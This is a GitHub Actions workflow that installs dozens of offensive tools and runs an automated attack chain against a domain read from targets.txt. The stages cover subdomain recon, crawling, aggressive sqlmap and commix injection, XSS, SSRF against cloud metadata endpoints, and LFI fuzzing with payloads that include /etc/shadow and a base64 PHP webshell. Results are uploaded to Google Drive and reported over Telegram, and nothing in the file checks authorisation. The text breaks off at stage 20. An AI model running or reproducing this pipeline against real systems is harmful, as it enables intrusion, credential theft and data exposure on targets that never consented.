name: ARES â€“ GitHub Safe Vulnerability Pipeline
on:
  workflow_dispatch:
env:
  GOPATH: /home/runner/go
  GO111MODULE: "on"
jobs:
  security-hunt:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    steps:
    - name: Checkout Repo
      uses: actions/checkout@v4
    - name: Clean previous data
      run: |
        rm -rf output *.zip || true
        mkdir -p output/{recon,probe,crawl,vulns,secrets,specialized,graphql,api,cloud,sql,nosql,xxe,auth,templates,deserialization,ssrf,lfi,redirect,crlf,takeover}
    - name: Install Go
      uses: actions/setup-go@v4
      with:
        go-version: '1.23'
    - name: Install core dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y python3-pip python3-venv zip curl wget git ruby-full libpcap-dev libxml2-dev libxslt1-dev libsqlite3-dev libffi-dev npm build-essential php-cli nikto
        echo "GOPATH=$HOME/go" >> $GITHUB_ENV
        echo "$HOME/go/bin" >> $GITHUB_PATH
        echo "/usr/local/go/bin" >> $GITHUB_PATH
        echo "$HOME/.local/bin" >> $GITHUB_PATH
        echo "$HOME/.cargo/bin" >> $GITHUB_PATH
        mkdir -p $HOME/tools
    - name: Install Rust
      run: |
        curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
        source $HOME/.cargo/env
        echo "$HOME/.cargo/bin" >> $GITHUB_PATH
    - name: Install massdns
      run: |
        git clone --depth 1 https://github.com/blechschmidt/massdns.git $HOME/tools/massdns
        cd $HOME/tools/massdns && make
        sudo cp bin/massdns /usr/local/bin/
    - name: Install SecLists
      run: |
        git clone --depth 1 https://github.com/danielmiessler/SecLists.git $HOME/SecLists
        sudo mkdir -p /usr/share/wordlists/
        sudo ln -sf $HOME/SecLists/Discovery/Web-Content/common.txt /usr/share/wordlists/common.txt
        sudo ln -sf $HOME/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt /usr/share/wordlists/dirb-medium.txt
        sudo ln -sf $HOME/SecLists/Discovery/Web-Content/raft-large-words.txt /usr/share/wordlists/raft-large.txt
        sudo ln -sf $HOME/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt /usr/share/wordlists/lfi.txt
    - name: Install Go tools - Core Recon
      run: |
        export PATH=$PATH:$HOME/go/bin:/usr/local/go/bin
        go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
        go install -v github.com/tomnomnom/assetfinder@latest
        go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
        go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
        go install -v github.com/projectdiscovery/katana/cmd/katana@latest
        go install -v github.com/lc/gau/v2/cmd/gau@latest
        go install -v github.com/tomnomnom/waybackurls@latest
        go install -v github.com/hakluke/hakrawler@latest
        go install -v github.com/tomnomnom/qsreplace@latest
        go install -v github.com/tomnomnom/unfurl@latest
        go install -v github.com/jaeles-project/gospider@latest
    - name: Install Go tools - Vulnerability Scanners
      run: |
        export PATH=$PATH:$HOME/go/bin:/usr/local/go/bin
        go install -v github.com/hahwul/dalfox/v2@latest
        go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
        go install -v github.com/Emoe/kxss@latest
        go install -v github.com/ffuf/ffuf/v2@latest
        go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
    - name: Install Go tools - Additional Scanners
      run: |
        export PATH=$PATH:$HOME/go/bin:/usr/local/go/bin
        # CRLFuzz - correct path with cmd/crlfuzz
        GO111MODULE=on go install -v github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest
        # Subzy - correct PentestPad repo
        go install -v github.com/PentestPad/subzy@latest
        # Naabu - port scanner
        go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
        # gf - pattern matcher
        go install -v github.com/tomnomnom/gf@latest
    - name: Install Go tools - Cloud & Other
      run: |
        export PATH=$PATH:$HOME/go/bin:/usr/local/go/bin
        go install -v github.com/aquasecurity/tfsec/cmd/tfsec@latest
        go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest
        go install -v github.com/d3mondev/puredns/v2@latest
        go install -v github.com/sensepost/gowitness@latest
        go install -v github.com/jaeles-project/jaeles@latest
        sudo cp $HOME/go/bin/* /usr/local/bin/ 2>/dev/null || true
    - name: Verify Go tools installation
      run: |
        echo "=== Verifying Go Tools ==="
        which subfinder && subfinder -version
        which httpx && httpx -version
        which nuclei && nuclei -version
        which ffuf && ffuf -V
        which katana && katana -version
        which dalfox && dalfox version
        which crlfuzz && crlfuzz -v
        which subzy && subzy version
        which naabu && naabu -version
        which gowitness && gowitness --help | head -1
        echo "=== All Go tools verified ==="
    - name: Install Python tools
      run: |
        pip3 install --upgrade pip --user
        pip3 install arjun checkov s3scanner swagger-parser commix --user
    - name: Install XSStrike
      run: |
        git clone --depth 1 https://github.com/s0md3v/XSStrike.git $HOME/tools/XSStrike
        cd $HOME/tools/XSStrike && pip3 install -r requirements.txt --user
        echo '#!/bin/bash' | sudo tee /usr/local/bin/xsstrike
        echo "python3 $HOME/tools/XSStrike/xsstrike.py \"\$@\"" | sudo tee -a /usr/local/bin/xsstrike
        sudo chmod +x /usr/local/bin/xsstrike
    - name: Install OpenRedireX
      run: |
        git clone --depth 1 https://github.com/devanshbatham/OpenRedireX.git $HOME/tools/OpenRedireX
        cd $HOME/tools/OpenRedireX
        pip3 install -r requirements.txt --user 2>/dev/null || true
        echo '#!/bin/bash' | sudo tee /usr/local/bin/openredirex
        echo "python3 $HOME/tools/OpenRedireX/openredirex.py \"\$@\"" | sudo tee -a /usr/local/bin/openredirex
        sudo chmod +x /usr/local/bin/openredirex
    - name: Install SSRFmap
      run: |
        git clone --depth 1 https://github.com/swisskyrepo/SSRFmap.git $HOME/tools/SSRFmap
        cd $HOME/tools/SSRFmap
        pip3 install -r requirements.txt --user 2>/dev/null || true
        echo '#!/bin/bash' | sudo tee /usr/local/bin/ssrfmap
        echo "python3 $HOME/tools/SSRFmap/ssrfmap.py \"\$@\"" | sudo tee -a /usr/local/bin/ssrfmap
        sudo chmod +x /usr/local/bin/ssrfmap
    - name: Install Oralyzer
      run: |
        git clone --depth 1 https://github.com/r0075h3ll/Oralyzer.git $HOME/tools/Oralyzer
        cd $HOME/tools/Oralyzer
        pip3 install -r requirements.txt --user 2>/dev/null || true
        echo '#!/bin/bash' | sudo tee /usr/local/bin/oralyzer
        echo "python3 $HOME/tools/Oralyzer/oralyzer.py \"\$@\"" | sudo tee -a /usr/local/bin/oralyzer
        sudo chmod +x /usr/local/bin/oralyzer
    - name: Install x8 (Rust)
      run: |
        source $HOME/.cargo/env
        cargo install x8
    - name: Install git-secrets
      run: |
        git clone --depth 1 https://github.com/awslabs/git-secrets.git $HOME/tools/git-secrets
        cd $HOME/tools/git-secrets && sudo make install
    - name: Install paramspider
      run: |
        git clone --depth 1 https://github.com/devanshbatham/paramspider.git $HOME/tools/paramspider
        cd $HOME/tools/paramspider
        pip3 install . --user
        echo '#!/bin/bash' | sudo tee /usr/local/bin/paramspider
        echo "python3 -m paramspider \"\$@\"" | sudo tee -a /usr/local/bin/paramspider
        sudo chmod +x /usr/local/bin/paramspider
    - name: Install ghauri
      run: |
        git clone --depth 1 https://github.com/r0oth3x49/ghauri.git $HOME/tools/ghauri
        cd $HOME/tools/ghauri
        pip3 install -r requirements.txt --user
        python3 -m pip install -e . --user
        echo '#!/bin/bash' | sudo tee /usr/local/bin/ghauri
        echo "cd $HOME/tools/ghauri && python3 -m ghauri \"\$@\"" | sudo tee -a /usr/local/bin/ghauri
        sudo chmod +x /usr/local/bin/ghauri
    - name: Install phpggc
      run: |
        git clone --depth 1 https://github.com/ambionics/phpggc.git $HOME/tools/phpggc
        echo '#!/bin/bash' | sudo tee /usr/local/bin/phpggc
        echo "cd $HOME/tools/phpggc && php ./phpggc \"\$@\"" | sudo tee -a /usr/local/bin/phpggc
        sudo chmod +x /usr/local/bin/phpggc
    - name: Install JWT Tool
      run: |
        git clone --depth 1 https://github.com/ticarpi/jwt_tool.git $HOME/tools/jwt_tool
        cd $HOME/tools/jwt_tool && pip3 install -r requirements.txt --user
        echo '#!/bin/bash' | sudo tee /usr/local/bin/jwt_tool
        echo "cd $HOME/tools/jwt_tool && python3 jwt_tool.py \"\$@\"" | sudo tee -a /usr/local/bin/jwt_tool
        sudo chmod +x /usr/local/bin/jwt_tool
    - name: Install TruffleHog
      run: |
        TRUFFLEHOG_URL=$(curl -s https://api.github.com/repos/trufflesecurity/trufflehog/releases/latest | grep "browser_download_url.*linux_amd64.tar.gz" | head -1 | cut -d '"' -f 4)
        curl -sL "$TRUFFLEHOG_URL" -o trufflehog.tar.gz
        tar -xzf trufflehog.tar.gz && chmod +x trufflehog
        sudo mv trufflehog /usr/local/bin/
        rm -f trufflehog.tar.gz
    - name: Install GraphQLMap
      run: |
        git clone --depth 1 https://github.com/swisskyrepo/GraphQLmap.git $HOME/tools/GraphQLmap
        cd $HOME/tools/GraphQLmap && pip3 install -r requirements.txt --user
        echo '#!/bin/bash' | sudo tee /usr/local/bin/graphqlmap
        echo "cd $HOME/tools/GraphQLmap && python3 graphqlmap.py \"\$@\"" | sudo tee -a /usr/local/bin/graphqlmap
        sudo chmod +x /usr/local/bin/graphqlmap
    - name: Install inql
      run: |
        pip3 install inql --user
        echo '#!/bin/bash' | sudo tee /usr/local/bin/inql
        echo 'python3 -c "from inql.cli import main; main()" "$@"' | sudo tee -a /usr/local/bin/inql
        sudo chmod +x /usr/local/bin/inql
    - name: Setup Jaeles signatures
      run: |
        mkdir -p $HOME/.jaeles
        jaeles config init || true
        git clone --depth 1 https://github.com/jaeles-project/jaeles-signatures.git $HOME/.jaeles/signatures-base
    - name: Install binaries
      run: |
        # gitleaks
        GITLEAKS_URL=$(curl -s https://api.github.com/repos/gitleaks/gitleaks/releases/latest | grep "browser_download_url.*linux_x64.tar.gz" | head -1 | cut -d '"' -f 4)
        curl -sL "$GITLEAKS_URL" -o gitleaks.tar.gz && tar -xzf gitleaks.tar.gz && sudo mv gitleaks /usr/local/bin/ && rm -f gitleaks.tar.gz
        
        # Feroxbuster
        FEROX_URL=$(curl -s https://api.github.com/repos/epi052/feroxbuster/releases/latest | grep "browser_download_url.*x86_64-linux-musl.tar.gz" | head -1 | cut -d '"' -f 4)
        curl -sL "$FEROX_URL" -o ferox.tar.gz && tar -xzf ferox.tar.gz && sudo mv feroxbuster /usr/local/bin/ && rm -f ferox.tar.gz
    - name: Install SQLMap
      run: |
        git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git $HOME/tools/sqlmap
        echo '#!/bin/bash' | sudo tee /usr/local/bin/sqlmap
        echo "python3 $HOME/tools/sqlmap/sqlmap.py \"\$@\"" | sudo tee -a /usr/local/bin/sqlmap
        sudo chmod +x /usr/local/bin/sqlmap
    - name: Install XXEinjector
      run: |
        git clone --depth 1 https://github.com/enjoiz/XXEinjector.git $HOME/tools/XXEinjector
        echo '#!/bin/bash' | sudo tee /usr/local/bin/xxeinjector
        echo "cd $HOME/tools/XXEinjector && ruby XXEinjector.rb \"\$@\"" | sudo tee -a /usr/local/bin/xxeinjector
        sudo chmod +x /usr/local/bin/xxeinjector
    - name: Install ppmap
      run: |
        git clone --depth 1 https://github.com/kleiton0x00/ppmap.git $HOME/tools/ppmap
        cd $HOME/tools/ppmap && pip3 install -r requirements.txt --user
        echo '#!/bin/bash' | sudo tee /usr/local/bin/ppmap
        echo "cd $HOME/tools/ppmap && python3 ppmap.py \"\$@\"" | sudo tee -a /usr/local/bin/ppmap
        sudo chmod +x /usr/local/bin/ppmap
    - name: Setup gf patterns
      run: |
        mkdir -p $HOME/.gf
        git clone --depth 1 https://github.com/1ndianl33t/Gf-Patterns.git $HOME/tools/gf-patterns
        cp $HOME/tools/gf-patterns/*.json $HOME/.gf/
    - name: Create Drive uploader
      run: |
        cat << 'EOF' > drive_upload.py
        import os, sys
        from google.oauth2.credentials import Credentials
        from googleapiclient.discovery import build
        from googleapiclient.http import MediaFileUpload
        def upload(file_path, folder_name):
            try:
                required_vars = ["GOOGLE_REFRESH_TOKEN", "GOOGLE_CLIENT_ID", "GOOGLE_CLIENT_SECRET", "GDRIVE_FOLDER_ID"]
                missing = [v for v in required_vars if not os.environ.get(v)]
                if missing:
                    print(f"ERROR: Missing env vars: {missing}")
                    return False
                creds = Credentials(None,
                    refresh_token=os.environ["GOOGLE_REFRESH_TOKEN"],
                    token_uri="https://oauth2.googleapis.com/token",
                    client_id=os.environ["GOOGLE_CLIENT_ID"],
                    client_secret=os.environ["GOOGLE_CLIENT_SECRET"])
                service = build("drive","v3",credentials=creds)
                query = f"name='{folder_name}' and '{os.environ['GDRIVE_FOLDER_ID']}' in parents and mimeType='application/vnd.google-apps.folder' and trashed=false"
                res = service.files().list(q=query).execute().get("files",[])
                folder_id = res[0]["id"] if res else service.files().create(
                    body={"name":folder_name,"mimeType":"application/vnd.google-apps.folder","parents":[os.environ["GDRIVE_FOLDER_ID"]]},
                    fields="id").execute()["id"]
                media = MediaFileUpload(file_path)
                uploaded = service.files().create(body={"name":os.path.basename(file_path),"parents":[folder_id]},media_body=media,fields="id").execute()
                print(f"SUCCESS: Uploaded {file_path} to {folder_name}")
                return True
            except Exception as e:
                print(f"ERROR: {e}")
                return False
        if __name__ == "__main__":
            upload(sys.argv[1], sys.argv[2]) if len(sys.argv) >= 3 else print("Usage: python3 drive_upload.py <file> <folder>")
        EOF
        pip3 install google-api-python-client google-auth-httplib2 google-auth-oauthlib --user
    - name: Setup resolvers
      run: |
        cat << 'EOF' > /tmp/resolvers.txt
        1.1.1.1
        8.8.8.8
        9.9.9.9
        8.8.4.4
        1.0.0.1
        208.67.222.222
        EOF
    - name: Create LFI & SSRF wordlists
      run: |
        # LFI Payloads
        cat << 'EOF' > /tmp/lfi_payloads.txt
        ../../../etc/passwd
        ....//....//....//etc/passwd
        ..%2F..%2F..%2Fetc%2Fpasswd
        %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
        ....\/....\/....\/etc/passwd
        /etc/passwd
        /etc/shadow
        /etc/hosts
        /proc/self/environ
        /var/log/apache2/access.log
        php://filter/convert.base64-encode/resource=index.php
        php://input
        data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
        expect://id
        file:///etc/passwd
        EOF
        
        # SSRF Payloads
        cat << 'EOF' > /tmp/ssrf_payloads.txt
        http://127.0.0.1
        http://localhost
        http://[::1]
        http://0.0.0.0
        http://169.254.169.254
        http://169.254.169.254/latest/meta-data/
        http://metadata.google.internal
        http://metadata.google.internal/computeMetadata/v1/
        http://192.168.1.1
        http://10.0.0.1
        file:///etc/passwd
        dict://localhost:11211/stat
        gopher://127.0.0.1:6379/_INFO
        EOF
    - name: Final verification of all tools
      run: |
        echo "=== FINAL TOOL VERIFICATION ==="
        echo "Checking all installed tools..."
        
        # Go tools
        for tool in subfinder httpx nuclei ffuf katana dalfox crlfuzz subzy naabu gowitness jaeles; do
          if command -v $tool &> /dev/null; then
            echo "âœ… $tool installed"
          else
            echo "âŒ $tool NOT FOUND"
          fi
        done
        
        # Python/other tools
        for tool in sqlmap nikto feroxbuster gitleaks trufflehog; do
          if command -v $tool &> /dev/null; then
            echo "âœ… $tool installed"
          else
            echo "âŒ $tool NOT FOUND"
          fi
        done
        
        echo "=== VERIFICATION COMPLETE ==="
    - name: Run ARES Pipeline (MAXIMUM POWER)
      env:
        GOOGLE_CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
        GOOGLE_CLIENT_SECRET: ${{ secrets.GOOGLE_CLIENT_SECRET }}
        GOOGLE_REFRESH_TOKEN: ${{ secrets.GOOGLE_REFRESH_TOKEN }}
        GDRIVE_FOLDER_ID: ${{ secrets.GDRIVE_FOLDER_ID }}
        TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
        TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
      run: |
        if [ ! -f targets.txt ]; then
          echo "example.com" > targets.txt
        fi
        
        TARGET=$(head -n 1 targets.txt)
        echo "=========================================="
        echo "ðŸŽ¯ ARES MAXIMUM POWER - Target: $TARGET"
        echo "=========================================="
        tg() {
          [ -n "$TELEGRAM_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ] && \
          curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
            -d chat_id="$TELEGRAM_CHAT_ID" -d parse_mode="Markdown" -d text="$1" > /dev/null 2>&1
          echo "[TG] $1"
        }
        tg "ðŸš€ *ARES MAXIMUM POWER* started on \`$TARGET\`"
        run_stage() {
          echo ""
          echo "========================================"
          echo "ðŸ“ $1"
          echo "========================================"
          set +e; eval "$2"; local rc=$?; set -e
          [ $rc -eq 0 ] && tg "âœ… $1 done" || tg "âš ï¸ $1 issues"
          return 0
        }
        ### STAGE 1: DEEP RECON
        run_stage "Stage 1: Deep Reconnaissance" '
          subfinder -d $TARGET -all -recursive -o output/recon/subfinder.txt 2>/dev/null || true
          assetfinder --subs-only $TARGET >> output/recon/subs.txt 2>/dev/null || true
          echo $TARGET | waybackurls | unfurl domains | sort -u >> output/recon/subs.txt 2>/dev/null || true
          echo $TARGET | gau --subs >> output/recon/gau_urls.txt 2>/dev/null || true
          cat output/recon/gau_urls.txt | unfurl domains | sort -u >> output/recon/subs.txt 2>/dev/null || true
          
          if [ -n "$PDCP_API_KEY" ]; then
            chaos -d $TARGET -silent >> output/recon/subs.txt 2>/dev/null || true
          fi
          
          cat output/recon/subfinder.txt output/recon/subs.txt 2>/dev/null | sort -u > output/recon/all_subs.txt
          dnsx -l output/recon/all_subs.txt -silent -a -aaaa -cname -resp > output/recon/dnsx.txt 2>/dev/null || true
          cat output/recon/dnsx.txt | cut -d" " -f1 | sort -u > output/recon/final_subs.txt
          
          echo "[+] Found $(wc -l < output/recon/final_subs.txt) subdomains"
          zip -r recon.zip output/recon/
          python3 drive_upload.py recon.zip Stage_1_Recon
        '
        ### STAGE 2: PROBING + PORT SCAN
        run_stage "Stage 2: Probing & Port Scan" '
          if [ -s output/recon/final_subs.txt ]; then
            naabu -l output/recon/final_subs.txt -p 80,443,8080,8443,8000,8888,9000,9090,3000,5000 -c 100 -o output/probe/ports.txt 2>/dev/null || true
            
            httpx -l output/recon/final_subs.txt \
              -ports 80,443,8080,8443,8000,8888,9000,9090,3000,5000 \
              -threads 100 -timeout 15 \
              -title -tech-detect -status-code -content-length -web-server \
              -follow-redirects -o output/probe/httpx_full.txt 2>/dev/null || true
            
            cat output/probe/httpx_full.txt | cut -d" " -f1 > output/probe/live.txt
            echo "[+] Live hosts: $(wc -l < output/probe/live.txt)"
            
            if [ -s output/probe/live.txt ]; then
              mkdir -p output/probe/screenshots/
              gowitness scan file -f output/probe/live.txt --screenshot-path output/probe/screenshots/ --threads 20 2>/dev/null || true
            fi
          fi
          zip -r probe.zip output/probe/
          python3 drive_upload.py probe.zip Stage_2_Probe
        '
        ### STAGE 3: DEEP CRAWLING
        run_stage "Stage 3: Deep Crawling" '
          if [ -s output/probe/live.txt ]; then
            katana -list output/probe/live.txt -depth 5 -js-crawl -known-files all -form-extraction -automatic-form-fill -headless -no-sandbox -timeout 30 -concurrency 30 -parallelism 15 -o output/crawl/katana.txt 2>/dev/null || true
            
            mkdir -p output/crawl/gospider/
            gospider -S output/probe/live.txt -d 5 -c 20 -t 50 --js --sitemap --robots -o output/crawl/gospider/ 2>/dev/null || true
            find output/crawl/gospider/ -type f -exec cat {} \; > output/crawl/gospider_all.txt 2>/dev/null || true
            
            cat output/probe/live.txt | hakrawler -d 5 -t 30 > output/crawl/hakrawler.txt 2>/dev/null || true
            cat output/probe/live.txt | waybackurls > output/crawl/wayback.txt 2>/dev/null || true
            cat output/probe/live.txt | gau --threads 20 > output/crawl/gau.txt 2>/dev/null || true
            paramspider -l output/probe/live.txt -o output/crawl/paramspider.txt 2>/dev/null || true
            
            cat output/probe/live.txt | while read url; do
              feroxbuster -u "$url" -w /usr/share/wordlists/common.txt -t 100 -d 5 --no-state -s 200,201,202,204,301,302,307,308,401,403,500 -o "output/crawl/ferox_$(echo $url | md5sum | cut -c1-8).txt" 2>/dev/null || true
            done
            
            cat output/crawl/*.txt 2>/dev/null | sort -u > output/crawl/all_urls.txt
            grep -E "[?&][^=]+=" output/crawl/all_urls.txt > output/crawl/params_only.txt 2>/dev/null || touch output/crawl/params_only.txt
            echo "[+] Total URLs: $(wc -l < output/crawl/all_urls.txt), Params: $(wc -l < output/crawl/params_only.txt)"
          fi
          zip -r crawl.zip output/crawl/
          python3 drive_upload.py crawl.zip Stage_3_Crawl
        '
        ### STAGE 4: PARAMETER DISCOVERY
        run_stage "Stage 4: Parameter Discovery" '
          if [ -s output/crawl/all_urls.txt ]; then
            cat output/crawl/all_urls.txt | qsreplace "FUZZ" | sort -u > output/crawl/qsreplace.txt
            cat output/crawl/all_urls.txt | kxss > output/crawl/kxss.txt 2>/dev/null || true
            cat output/crawl/all_urls.txt | unfurl -u keys > output/crawl/param_keys.txt 2>/dev/null || true
          fi
          
          if [ -s output/probe/live.txt ]; then
            head -20 output/probe/live.txt | while read url; do
              x8 -u "$url" -w /usr/share/wordlists/common.txt -o "output/crawl/x8_$(echo $url | md5sum | cut -c1-8).txt" 2>/dev/null || true
              arjun -u "$url" -oT "output/crawl/arjun_$(echo $url | md5sum | cut -c1-8).txt" 2>/dev/null || true
            done
          fi
          zip -r params.zip output/crawl/
          python3 drive_upload.py params.zip Stage_4_Params
        '
        ### STAGE 5: NUCLEI FULL SCAN
        run_stage "Stage 5: Nuclei Full Scan" '
          if [ -s output/probe/live.txt ]; then
            nuclei -l output/probe/live.txt -severity info,low,medium,high,critical -c 100 -bs 50 -timeout 15 -retries 3 -o output/vulns/nuclei.txt 2>/dev/null || true
            echo "[+] Nuclei findings: $(wc -l < output/vulns/nuclei.txt 2>/dev/null || echo 0)"
          fi
          zip -r nuclei.zip output/vulns/
          python3 drive_upload.py nuclei.zip Stage_5_Nuclei
        '
        ### STAGE 6: XSS HUNTING
        run_stage "Stage 6: XSS Hunting" '
          if [ -s output/crawl/params_only.txt ]; then
            dalfox file output/crawl/params_only.txt --deep-domxss --follow-redirects -o output/vulns/dalfox.txt 2>/dev/null || true
            head -50 output/crawl/params_only.txt | while read url; do
              xsstrike -u "$url" --crawl -l 3 >> output/vulns/xsstrike.txt 2>&1 || true
            done
          fi
          [ -s output/crawl/kxss.txt ] && cp output/crawl/kxss.txt output/vulns/kxss_reflections.txt
          zip -r xss.zip output/vulns/
          python3 drive_upload.py xss.zip Stage_6_XSS
        '
        ### STAGE 7: SQL INJECTION
        run_stage "Stage 7: SQL Injection" '
          mkdir -p output/sql
          if [ -s output/crawl/params_only.txt ]; then
            sqlmap -m output/crawl/params_only.txt --batch --risk 3 --level 5 --threads 10 --random-agent > output/sql/sqlmap.txt 2>&1 || true
            head -30 output/crawl/params_only.txt | while read url; do
              ghauri -u "$url" --batch --threads 10 >> output/sql/ghauri.txt 2>&1 || true
            done
          fi
          zip -r sql.zip output/sql/
          python3 drive_upload.py sql.zip Stage_7_SQL
        '
        ### STAGE 8: SSRF TESTING
        run_stage "Stage 8: SSRF Testing" '
          mkdir -p output/ssrf
          if [ -s output/crawl/params_only.txt ]; then
            grep -iE "url=|uri=|path=|dest=|redirect=|next=|data=|reference=|site=|html=|src=|file=|load=" output/crawl/params_only.txt > output/ssrf/ssrf_params.txt 2>/dev/null || true
            head -20 output/ssrf/ssrf_params.txt | while read url; do
              ffuf -u "$(echo $url | qsreplace FUZZ)" -w /tmp/ssrf_payloads.txt -mc 200,301,302,500 -o "output/ssrf/ffuf_$(echo $url | md5sum | cut -c1-8).json" 2>/dev/null || true
            done
          fi
          zip -r ssrf.zip output/ssrf/
          python3 drive_upload.py ssrf.zip Stage_8_SSRF
        '
        ### STAGE 9: LFI TESTING
        run_stage "Stage 9: LFI Testing" '
          mkdir -p output/lfi
          if [ -s output/crawl/params_only.txt ]; then
            grep -iE "file=|path=|page=|include=|doc=|document=|folder=|root=|pg=|view=|read=|template=|log=" output/crawl/params_only.txt > output/lfi/lfi_params.txt 2>/dev/null || true
            head -20 output/lfi/lfi_params.txt | while read url; do
              ffuf -u "$(echo $url | qsreplace FUZZ)" -w /tmp/lfi_payloads.txt -mc 200 -fr "root:" -o "output/lfi/ffuf_$(echo $url | md5sum | cut -c1-8).json" 2>/dev/null || true
            done
          fi
          zip -r lfi.zip output/lfi/
          python3 drive_upload.py lfi.zip Stage_9_LFI
        '
        ### STAGE 10: OPEN REDIRECT
        run_stage "Stage 10: Open Redirect" '
          mkdir -p output/redirect
          if [ -s output/crawl/params_only.txt ]; then
            grep -iE "url=|redirect=|next=|return=|rurl=|dest=|destination=|redir=|redirect_url=|go=|target=|link=|out=|view=|to=" output/crawl/params_only.txt > output/redirect/redirect_params.txt 2>/dev/null || true
            cat output/redirect/redirect_params.txt | openredirex -p "https://evil.com" > output/redirect/openredirex.txt 2>/dev/null || true
            oralyzer -l output/redirect/redirect_params.txt > output/redirect/oralyzer.txt 2>/dev/null || true
          fi
          zip -r redirect.zip output/redirect/
          python3 drive_upload.py redirect.zip Stage_10_OpenRedirect
        '
        ### STAGE 11: CRLF INJECTION
        run_stage "Stage 11: CRLF Injection" '
          mkdir -p output/crlf
          if [ -s output/probe/live.txt ]; then
            crlfuzz -l output/probe/live.txt -o output/crlf/crlfuzz.txt 2>/dev/null || true
            echo "[+] CRLF findings: $(wc -l < output/crlf/crlfuzz.txt 2>/dev/null || echo 0)"
          fi
          zip -r crlf.zip output/crlf/
          python3 drive_upload.py crlf.zip Stage_11_CRLF
        '
        ### STAGE 12: SUBDOMAIN TAKEOVER
        run_stage "Stage 12: Subdomain Takeover" '
          mkdir -p output/takeover
          if [ -s output/recon/final_subs.txt ]; then
            subzy run --targets output/recon/final_subs.txt --output output/takeover/subzy.txt 2>/dev/null || true
            nuclei -l output/recon/final_subs.txt -t takeovers/ -o output/takeover/nuclei_takeover.txt 2>/dev/null || true
          fi
          zip -r takeover.zip output/takeover/
          python3 drive_upload.py takeover.zip Stage_12_Takeover
        '
        ### STAGE 13: NIKTO WEB SCAN
        run_stage "Stage 13: Nikto Web Scan" '
          mkdir -p output/nikto
          if [ -s output/probe/live.txt ]; then
            head -10 output/probe/live.txt | while read url; do
              nikto -h "$url" -Tuning 123bde -timeout 10 -maxtime 300 > "output/nikto/nikto_$(echo $url | md5sum | cut -c1-8).txt" 2>&1 || true
            done
          fi
          zip -r nikto.zip output/nikto/
          python3 drive_upload.py nikto.zip Stage_13_Nikto
        '
        ### STAGE 14: COMMAND INJECTION
        run_stage "Stage 14: Command Injection" '
          mkdir -p output/cmdi
          if [ -s output/crawl/params_only.txt ]; then
            head -30 output/crawl/params_only.txt | while read url; do
              commix -u "$url" --batch --all >> output/cmdi/commix.txt 2>&1 || true
            done
          fi
          zip -r cmdi.zip output/cmdi/
          python3 drive_upload.py cmdi.zip Stage_14_CommandInjection
        '
        ### STAGE 15: CONTENT FUZZING
        run_stage "Stage 15: Content Fuzzing" '
          if [ -s output/probe/live.txt ]; then
            cat output/probe/live.txt | while read url; do
              ffuf -u "$url/FUZZ" -w /usr/share/wordlists/common.txt -t 150 -timeout 15 -mc 200,201,202,204,301,302,307,401,403 -o "output/vulns/ffuf_$(echo $url | md5sum | cut -c1-8).json" 2>/dev/null || true
            done
          fi
          zip -r fuzzing.zip output/vulns/
          python3 drive_upload.py fuzzing.zip Stage_15_Fuzzing
        '
        ### STAGE 16: JAELES SCANNER
        run_stage "Stage 16: Jaeles Scanner" '
          if [ -s output/crawl/all_urls.txt ]; then
            jaeles scan -s $HOME/.jaeles/signatures-base -U output/crawl/all_urls.txt -c 30 -o output/specialized/jaeles/ 2>/dev/null || true
          fi
          zip -r jaeles.zip output/specialized/
          python3 drive_upload.py jaeles.zip Stage_16_Jaeles
        '
        ### STAGE 17: SECRETS
        run_stage "Stage 17: Secrets Detection" '
          trufflehog filesystem . --no-update > output/secrets/trufflehog.txt 2>/dev/null || true
          gitleaks detect --no-git -v > output/secrets/gitleaks.txt 2>&1 || true
          git-secrets --scan > output/secrets/git_secrets.txt 2>&1 || true
          zip -r secrets.zip output/secrets/
          python3 drive_upload.py secrets.zip Stage_17_Secrets
        '
        ### STAGE 18: GRAPHQL & API
        run_stage "Stage 18: GraphQL & API" '
          grep -iE "graphql|/api/" output/crawl/all_urls.txt > output/graphql/found_apis.txt 2>/dev/null || true
          for path in /graphql /api/graphql /v1/graphql /graphql/console; do
            echo "https://$TARGET$path" >> output/graphql/endpoints.txt
          done
          while read endpoint; do
            [ -n "$endpoint" ] || continue
            timeout 120 graphqlmap -u "$endpoint" -v >> output/graphql/graphqlmap.txt 2>&1 || true
          done < output/graphql/endpoints.txt
          zip -r graphql.zip output/graphql/ output/api/
          python3 drive_upload.py graphql.zip Stage_18_GraphQL
        '
        ### STAGE 19: XXE & DESERIALIZATION
        run_stage "Stage 19: XXE & Deserialization" '
          mkdir -p output/xxe output/deserialization
          grep -iE "\.xml|xml=|xmlrpc|soap|wsdl" output/crawl/all_urls.txt > output/xxe/endpoints.txt 2>/dev/null || true
          grep -iE "serialize|base64|viewstate|pickle" output/crawl/all_urls.txt > output/deserialization/endpoints.txt 2>/dev/null || true
          phpggc --list > output/deserialization/phpggc.txt 2>&1 || true
          zip -r xxe_deser.zip output/xxe/ output/deserialization/
          python3 drive_upload.py xxe_deser.zip Stage_19_XXE_Deserialization
        '
        ### STAGE 20: JWT & AUTH
        run_stage "Stage 20: JWT & Authentication" '
          mkdir -p output/auth
